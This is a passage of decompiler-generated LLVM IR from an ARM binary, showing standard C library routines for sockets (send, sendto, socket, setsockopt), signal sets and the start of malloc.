  store i32 %v21_11590, i32* @sl, align 4
  store i32 %v24_11590, i32* @lr, align 4
  ret i32 %v0_11600

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115d4, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11618 = load i32, i32* @r7, align 4
  store i32 %v3_11618, i32* %stack_var_-8, align 4
  %v0_11624 = load i32, i32* @r0, align 4
  store i32 %v0_11624, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11624, -4095
  br i1 %tmp, label %dec_label_pc_1164c, label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %entry
  %v0_11638 = call i32 @__aeabi_read_tp()
  %v3_1163c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1163c = sext i16 %v3_1163c to i32
  store i32 %v4_1163c, i32* @r3, align 4
  %v0_11640 = load i32, i32* %r2.global-to-local, align 4
  %v1_11640 = sub i32 0, %v0_11640
  store i32 %v1_11640, i32* %r2.global-to-local, align 4
  %v3_11644 = add i32 %v4_1163c, %v0_11638
  %v4_11644 = inttoptr i32 %v3_11644 to i32*
  store i32 %v1_11640, i32* %v4_11644, align 4
  %v2_1164c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %entry, %dec_label_pc_11634
  %v1_11650 = phi i32 [ %v0_11624, %entry ], [ -1, %dec_label_pc_11634 ]
  %v2_1164c = phi i32 [ %v3_11618, %entry ], [ %v2_1164c.pre, %dec_label_pc_11634 ]
  store i32 %v2_1164c, i32* @r7, align 4
  ret i32 %v1_11650

; uselistorder directives
  uselistorder i32 %v0_11624, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1164c, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11654:
  %v0_11654 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11654, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11654
  %v2_11658 = load i32, i32* @r8, align 4
  %v5_11658 = udiv i32 %v2_11658, 2
  %v6_11658 = and i32 %v5_11658, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11654, %bb
  %v7_11658 = phi i32 [ %arg1, %dec_label_pc_11654 ], [ %v6_11658, %bb ]
  ret i32 %v7_11658

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11660 = load i32, i32* @r4, align 4
  store i32 %v3_11660, i32* %stack_var_-24, align 4
  %v6_11660 = load i32, i32* @r5, align 4
  %v9_11660 = load i32, i32* @r6, align 4
  %v12_11660 = load i32, i32* @r7, align 4
  %v15_11660 = load i32, i32* @r8, align 4
  %v18_11660 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @ip, align 4
  %v4_1166c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_11670 = icmp eq i32 %v4_1166c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11670, label %dec_label_pc_11688, label %entry.dec_label_pc_11690_crit_edge

entry.dec_label_pc_11690_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11690

dec_label_pc_11688:                               ; preds = %entry
  store i32 %v3_11660, i32* @r4, align 4
  store i32 %v9_11660, i32* @r6, align 4
  store i32 %v12_11660, i32* @r7, align 4
  store i32 %v15_11660, i32* @r8, align 4
  %v0_1168c = call i32 @__sys_send()
  br label %dec_label_pc_11690

dec_label_pc_11690:                               ; preds = %entry.dec_label_pc_11690_crit_edge, %dec_label_pc_11688
  %v0_11690 = call i32 @__libc_enable_asynccancel()
  %v0_11694 = load i32, i32* @r6, align 4
  store i32 %v0_11694, i32* @r1, align 4
  store i32 %v0_11690, i32* @r5, align 4
  %v0_116a0 = load i32, i32* @r8, align 4
  store i32 %v0_116a0, i32* @r3, align 4
  %v0_116a4 = load i32, i32* @r4, align 4
  store i32 %v0_116a4, i32* @r0, align 4
  %v0_116a8 = call i32 @__sys_send()
  store i32 %v0_116a8, i32* @r4, align 4
  %v0_116b0 = load i32, i32* @r5, align 4
  %v1_116b4 = call i32 @__libc_disable_asynccancel(i32 %v0_116b0)
  %v0_116b8 = load i32, i32* @r4, align 4
  %v2_116bc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_116bc, i32* @r4, align 4
  store i32 %v6_11660, i32* @r5, align 4
  store i32 %v9_11660, i32* @r6, align 4
  store i32 %v12_11660, i32* @r7, align 4
  store i32 %v15_11660, i32* @r8, align 4
  store i32 %v18_11660, i32* @lr, align 4
  ret i32 %v0_116b8

; uselistorder directives
  uselistorder label %dec_label_pc_11690, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_116cc = load i32, i32* @r4, align 4
  store i32 %v3_116cc, i32* %stack_var_-16, align 4
  %v0_116e0 = load i32, i32* @r0, align 4
  store i32 %v0_116e0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_116e0, -4095
  br i1 %tmp, label %dec_label_pc_11708, label %dec_label_pc_116f0

dec_label_pc_116f0:                               ; preds = %entry
  %v0_116f4 = call i32 @__aeabi_read_tp()
  %v3_116f8 = load i16, i16* @global_var_216ec.303, align 2
  %v4_116f8 = sext i16 %v3_116f8 to i32
  %v0_116fc = load i32, i32* %r2.global-to-local, align 4
  %v1_116fc = sub i32 0, %v0_116fc
  store i32 %v1_116fc, i32* %r2.global-to-local, align 4
  %v3_11700 = add i32 %v4_116f8, %v0_116f4
  %v4_11700 = inttoptr i32 %v3_11700 to i32*
  store i32 %v1_116fc, i32* %v4_11700, align 4
  %v2_11708.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %entry, %dec_label_pc_116f0
  %v1_1170c = phi i32 [ %v0_116e0, %entry ], [ -1, %dec_label_pc_116f0 ]
  %v2_11708 = phi i32 [ %v3_116cc, %entry ], [ %v2_11708.pre, %dec_label_pc_116f0 ]
  store i32 %v2_11708, i32* @r4, align 4
  ret i32 %v1_1170c

; uselistorder directives
  uselistorder i32 %v0_116e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11708, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11710:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11710 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11710, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11710
  %v5_11710 = udiv i32 %arg2, 4
  %v6_11710 = and i32 %v5_11710, %arg1
  store i32 %v6_11710, i32* %r0.global-to-local, align 4
  %v2_11714 = load i32, i32* @ip, align 4
  %tmp = icmp slt i32 %v2_11714, 0
  %v3_11714 = zext i1 %tmp to i32
  %v4_11714 = mul i32 %v2_11714, 2
  %v5_11714 = or i32 %v3_11714, %v4_11714
  %v8_11714 = and i32 %v5_11714, %v6_11710
  call void @__pseudo_branch(i32 %v8_11714)
  %v9_11714.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11710, %bb
  %v9_11714 = phi i32 [ %arg1, %dec_label_pc_11710 ], [ %v9_11714.pre, %bb ]
  ret i32 %v9_11714

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11718 = load i32, i32* @r4, align 4
  store i32 %v3_11718, i32* %stack_var_-32, align 4
  %v6_11718 = load i32, i32* @r5, align 4
  %v9_11718 = load i32, i32* @r6, align 4
  %v12_11718 = load i32, i32* @r7, align 4
  %v15_11718 = load i32, i32* @r8, align 4
  %v18_11718 = load i32, i32* @sb, align 4
  %v21_11718 = load i32, i32* @sl, align 4
  %v24_11718 = load i32, i32* @lr, align 4
  %v4_11728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_11730 = icmp eq i32 %v4_11728, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11730, label %dec_label_pc_11750, label %dec_label_pc_1175c

dec_label_pc_11750:                               ; preds = %entry
  store i32 %v3_11718, i32* @r4, align 4
  store i32 %v12_11718, i32* @r7, align 4
  store i32 %v15_11718, i32* @r8, align 4
  store i32 %v18_11718, i32* %sb.global-to-local, align 4
  %v0_11758 = call i32 @__sys_sendto()
  br label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %entry, %dec_label_pc_11750
  %v0_1175c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1175c, i32* @r5, align 4
  %v0_11770 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11770, i32* @r0, align 4
  %v0_11778 = call i32 @__sys_sendto()
  store i32 %v0_11778, i32* @r4, align 4
  %v0_11780 = load i32, i32* @r5, align 4
  %v1_11784 = call i32 @__libc_disable_asynccancel(i32 %v0_11780)
  %v0_11788 = load i32, i32* @r4, align 4
  %v2_11790 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11790, i32* @r4, align 4
  store i32 %v6_11718, i32* @r5, align 4
  store i32 %v9_11718, i32* @r6, align 4
  store i32 %v12_11718, i32* @r7, align 4
  store i32 %v15_11718, i32* @r8, align 4
  store i32 %v18_11718, i32* @sb, align 4
  store i32 %v21_11718, i32* @sl, align 4
  store i32 %v24_11718, i32* @lr, align 4
  ret i32 %v0_11788

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1175c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_117a0 = load i32, i32* @r4, align 4
  store i32 %v3_117a0, i32* %stack_var_-12, align 4
  %v0_117b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_117b0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_117b0, -4095
  br i1 %tmp, label %dec_label_pc_117d8, label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %entry
  %v0_117c4 = call i32 @__aeabi_read_tp()
  %v3_117c8 = load i16, i16* @global_var_216ec.303, align 2
  %v4_117c8 = sext i16 %v3_117c8 to i32
  store i32 %v4_117c8, i32* @r3, align 4
  %v0_117cc = load i32, i32* %r2.global-to-local, align 4
  %v1_117cc = sub i32 0, %v0_117cc
  store i32 %v1_117cc, i32* %r2.global-to-local, align 4
  %v3_117d0 = add i32 %v4_117c8, %v0_117c4
  %v4_117d0 = inttoptr i32 %v3_117d0 to i32*
  store i32 %v1_117cc, i32* %v4_117d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_117d8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_117d8

dec_label_pc_117d8:                               ; preds = %entry, %dec_label_pc_117c0
  %v1_117dc = phi i32 [ %v0_117b0, %entry ], [ -1, %dec_label_pc_117c0 ]
  %v2_117d8 = phi i32 [ %v3_117a0, %entry ], [ %v2_117d8.pre, %dec_label_pc_117c0 ]
  store i32 %v2_117d8, i32* @r4, align 4
  ret i32 %v1_117dc

; uselistorder directives
  uselistorder i32 %v0_117b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_117d8, { 1, 0 }
}

define i32 @"$d"(i32 %arg1) local_unnamed_addr {
dec_label_pc_117e0:
  %v0_117e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_117e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_117e0
  %v3_117e4 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_117e0, %bb
  %v4_117e4 = phi i32 [ %arg1, %dec_label_pc_117e0 ], [ %v3_117e4, %bb ]
  ret i32 %v4_117e4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_117e8 = load i32, i32* @r7, align 4
  store i32 %v3_117e8, i32* %stack_var_-8, align 4
  %v0_117f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_117f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_117f4, -4095
  br i1 %tmp, label %dec_label_pc_1181c, label %dec_label_pc_11804

dec_label_pc_11804:                               ; preds = %entry
  %v0_11808 = call i32 @__aeabi_read_tp()
  %v3_1180c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1180c = sext i16 %v3_1180c to i32
  store i32 %v4_1180c, i32* @r3, align 4
  %v0_11810 = load i32, i32* %r2.global-to-local, align 4
  %v1_11810 = sub i32 0, %v0_11810
  store i32 %v1_11810, i32* %r2.global-to-local, align 4
  %v3_11814 = add i32 %v4_1180c, %v0_11808
  %v4_11814 = inttoptr i32 %v3_11814 to i32*
  store i32 %v1_11810, i32* %v4_11814, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1181c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1181c

dec_label_pc_1181c:                               ; preds = %entry, %dec_label_pc_11804
  %v1_11820 = phi i32 [ %v0_117f4, %entry ], [ -1, %dec_label_pc_11804 ]
  %v2_1181c = phi i32 [ %v3_117e8, %entry ], [ %v2_1181c.pre, %dec_label_pc_11804 ]
  store i32 %v2_1181c, i32* @r7, align 4
  ret i32 %v1_11820

; uselistorder directives
  uselistorder i32 %v0_117f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1181c, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11844, label %dec_label_pc_1183c

dec_label_pc_1183c:                               ; preds = %entry
  %v7_11840 = icmp slt i32 %arg1, 65
  br i1 %v7_11840, label %dec_label_pc_11860, label %dec_label_pc_11844

dec_label_pc_11844:                               ; preds = %dec_label_pc_1183c, %entry
  %v0_11848 = call i32 @__aeabi_read_tp()
  %v3_1184c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1184c = sext i16 %v3_1184c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11858 = add i32 %v4_1184c, %v0_11848
  %v4_11858 = inttoptr i32 %v3_11858 to i32*
  store i32 22, i32* %v4_11858, align 4
  %v0_11868.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11868

dec_label_pc_11860:                               ; preds = %dec_label_pc_1183c
  %v0_11860 = call i32 @__sigaddset()
  store i32 %v0_11860, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %dec_label_pc_11844, %dec_label_pc_11860
  %v0_11868 = phi i32 [ %v0_11868.pre, %dec_label_pc_11844 ], [ %v0_11860, %dec_label_pc_11860 ]
  ret i32 %v0_11868

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11868, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11884 = add i32 %tmp, 4
  %v3_11884 = inttoptr i32 %v2_11884 to i32*
  store i32 0, i32* %v3_11884, align 4
  %v1_11888 = load i32, i32* %r3.global-to-local, align 4
  %v2_11888 = inttoptr i32 %v1_11888 to i32*
  store i32 0, i32* %v2_11888, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11890 = load i32, i32* @r4, align 4
  store i32 %v3_11890, i32* %stack_var_-16, align 4
  %v6_11890 = load i32, i32* @r5, align 4
  %v9_11890 = load i32, i32* @r6, align 4
  %v7_11898 = icmp eq i32 %arg2, -1
  br i1 %v7_11898, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_118a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_118bc

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_118c4

dec_label_pc_118bc:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  %v7_118c0 = icmp slt i32 %arg1, 65
  br i1 %v7_118c0, label %dec_label_pc_118e0, label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %.thread16, %dec_label_pc_118bc
  %v0_118c8 = call i32 @__aeabi_read_tp()
  %v3_118cc = load i16, i16* @global_var_216ec.303, align 2
  %v4_118cc = sext i16 %v3_118cc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_118d8 = add i32 %v4_118cc, %v0_118c8
  %v4_118d8 = inttoptr i32 %v3_118d8 to i32*
  store i32 22, i32* %v4_118d8, align 4
  %v0_11938.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_118e0:                               ; preds = %dec_label_pc_118bc
  %v2_118e0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_118e0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_118e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_118e8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_118f8 = call i32 @__sigaddset()
  %v0_11900 = load i32, i32* @r5, align 4
  store i32 %v0_11900, i32* %r1.global-to-local, align 4
  %v0_11904 = load i32, i32* @r6, align 4
  %v2_11904 = add i32 %v0_11904, 11872
  %v2_11908 = call i32 @__GI___sigismember(i32 %v2_11904, i32 %v0_11900)
  store i32 %v2_118e0, i32* %r1.global-to-local, align 4
  %v0_1191c = load i32, i32* @r5, align 4
  %v3_11928 = call i32 @__libc_sigaction(i32 %v0_1191c, i32 %v2_118e0, i32 %v2_118a0)
  %v1_1192c = icmp slt i32 %v3_11928, 0
  br i1 %v1_1192c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_118e0
  %v5_11930 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11930, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_118e0
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_118c4, %bb32
  %v0_11938 = phi i32 [ %v5_11930, %bb31 ], [ %v0_11938.pre, %dec_label_pc_118c4 ], [ -1, %bb32 ]
  %v2_11940 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11940, i32* @r4, align 4
  store i32 %v6_11890, i32* @r5, align 4
  store i32 %v9_11890, i32* @r6, align 4
  ret i32 %v0_11938

; uselistorder directives
  uselistorder i32 %v2_118e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118c4, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11954 = add i32 %arg2, -1
  %v3_11958 = udiv i32 %v1_11954, 32
  %v4_1195c = mul nuw nsw i32 %v3_11958, 4
  %v5_1195c = add i32 %v4_1195c, %arg1
  %v6_1195c = inttoptr i32 %v5_1195c to i32*
  %v7_1195c = load i32, i32* %v6_1195c, align 4
  %v1_11960 = urem i32 %v1_11954, 32
  %v7_11968 = shl i32 1, %v1_11960
  %v8_11968 = and i32 %v7_1195c, %v7_11968
  %v10_11968 = icmp ne i32 %v8_11968, 0
  %. = zext i1 %v10_11968 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11954, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_11978 = load i32, i32* @r1, align 4
  %v1_11978 = add i32 %v0_11978, -1
  %v3_1197c = udiv i32 %v1_11978, 32
  %v0_11980 = load i32, i32* @r0, align 4
  %v4_11980 = mul nuw nsw i32 %v3_1197c, 4
  %v5_11980 = add i32 %v0_11980, %v4_11980
  %v6_11980 = inttoptr i32 %v5_11980 to i32*
  %v7_11980 = load i32, i32* %v6_11980, align 4
  %v1_11984 = urem i32 %v1_11978, 32
  %v7_1198c = shl i32 1, %v1_11984
  %v8_1198c = or i32 %v7_11980, %v7_1198c
  store i32 %v8_1198c, i32* %v6_11980, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11978, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1199c = add i32 %arg2, -1
  %v3_119a0 = udiv i32 %v1_1199c, 32
  %v4_119a4 = mul nuw nsw i32 %v3_119a0, 4
  %v5_119a4 = add i32 %v4_119a4, %arg1
  %v6_119a4 = inttoptr i32 %v5_119a4 to i32*
  %v7_119a4 = load i32, i32* %v6_119a4, align 4
  %v1_119a8 = urem i32 %v1_1199c, 32
  %tmp = shl i32 -1, %v1_119a8
  %v8_119b0 = add i32 %tmp, -1
  %v9_119b0 = and i32 %v7_119a4, %v8_119b0
  store i32 %v9_119b0, i32* %v6_119a4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1199c, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_119c0 = udiv i32 %arg1, 256
  store i32 %v3_119c0, i32* %r1.global-to-local, align 4
  %v2_119c4 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_119c4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_119d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_119c4, i32 %v0_119d0)
  %v0_119d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_119d4 = add i32 %v0_119d4, 1048320
  %v3_119d8 = udiv i32 %v1_119d4, 65536
  %v1_119dc = and i32 %v3_119d8, 8
  %v6_119e0 = shl i32 %v0_119d4, %v1_119dc
  %v1_119e4 = add i32 %v6_119e0, 520192
  %v3_119e8 = udiv i32 %v1_119e4, 65536
  %v1_119ec = and i32 %v3_119e8, 4
  %v6_119f0 = shl i32 %v6_119e0, %v1_119ec
  %v1_119f4 = add i32 %v6_119f0, 245760
  %v3_119f8 = udiv i32 %v1_119f4, 65536
  %v1_119fc = and i32 %v3_119f8, 2
  %v6_11a00 = shl i32 %v6_119f0, %v1_119fc
  store i32 %v6_11a00, i32* %r1.global-to-local, align 4
  %v1_11a04 = sub nsw i32 13, %v1_119dc
  %v2_11a08 = sub nsw i32 %v1_11a04, %v1_119ec
  %v3_11a0c = udiv i32 %v6_11a00, 32768
  %v4_11a0c = sub nuw nsw i32 -1, %v3_11a0c
  %v4_11a10 = udiv i32 %v6_11a00, 16384
  %v5_11a10 = and i32 %v4_11a10, %v4_11a0c
  %v2_11a14 = sub nsw i32 %v2_11a08, %v1_119fc
  %v2_11a18 = add nsw i32 %v2_11a14, %v5_11a10
  %v1_11a1c = add nsw i32 %v2_11a18, 6
  %v0_11a20 = load i32, i32* %ip.global-to-local, align 4
  %v6_11a20 = lshr i32 %v0_11a20, %v1_11a1c
  %v3_11a24 = mul nsw i32 %v2_11a18, 4
  %v1_11a28 = add nsw i32 %v3_11a24, 32
  %v1_11a2c = urem i32 %v6_11a20, 4
  %v2_11a30 = or i32 %v1_11a2c, %v1_11a28
  ret i32 %v2_11a30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11a38 = load i32, i32* @r4, align 4
  %v6_11a38 = load i32, i32* @r5, align 4
  %v9_11a38 = load i32, i32* @r6, align 4
  %v12_11a38 = load i32, i32* @r7, align 4
  %v15_11a38 = load i32, i32* @r8, align 4
  %v18_11a38 = load i32, i32* @sb, align 4
  %v21_11a38 = load i32, i32* @sl, align 4
  %v24_11a38 = load i32, i32* @fp, align 4
  %v27_11a38 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_11a4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 108) to i32*), align 4
  store i32 %v4_11a4c, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_11a58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), align 4
  store i32 %v4_11a58, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_11a4c, i32* %r2.global-to-local, align 4
  %v2_11a64 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11a64, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v4_11a70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  store i32 %v4_11a70, i32* %ip.global-to-local, align 4
  store i32 72316, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11a70)
  %v0_11a7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11a7c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r1, align 4
  %v4_11a88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 16) to i32*), align 4
  store i32 %v4_11a88, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11a94.394 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11a88)
  %v0_11a94 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11a94, -32
  br i1 %tmp, label %dec_label_pc_11ab8, label %dec_label_pc_11a9c

dec_label_pc_11a9c:                               ; preds = %entry
  store i32 64576, i32* %r2.global-to-local, align 4
  %v0_11aa0 = call i32 @__aeabi_read_tp()
  store i32 %v0_11aa0, i32* %r0.global-to-local, align 4
  %v3_11aa4 = load i16, i16* @global_var_216ec.303, align 2
  %v4_11aa4 = sext i16 %v3_11aa4 to i32
  store i32 %v4_11aa4, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11ab0 = add i32 %v4_11aa4, %v0_11aa0
  %v4_11ab0 = inttoptr i32 %v3_11ab0 to i32*
  store i32 12, i32* %v4_11ab0, align 4
